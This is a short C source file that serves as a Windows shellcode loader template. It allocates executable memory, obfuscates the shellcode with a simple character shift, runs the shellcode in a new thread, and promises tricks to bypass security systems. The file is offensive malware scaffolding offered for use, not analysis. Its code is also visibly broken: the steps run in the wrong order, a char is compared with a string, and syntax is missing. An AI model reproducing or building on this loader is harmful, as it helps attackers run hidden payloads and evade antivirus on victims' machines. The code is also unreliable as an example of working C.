
#include <Windows.h>



/*

This program has less debugging stuff, but it (soon) contains tricks to bypass various security systems.

*/




void main()
{	// Encripted shellcode should have all x's as zeta's and then ceazared by 13
	const char shellcode[] = "(yer encripted shellcode here)";
	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	for (int i = 0; i < sizeof(shellcode); i++)//Decript
	{
		((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) - 13;
	}
	for (int i=0; i<sizeof(shellcode); i++)
	{
		if(((char*)shellcode_exec)[i] == "zeta")
		{
			((char*)shellcode_exec)[i] = "x"
		}
	}
	
	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}
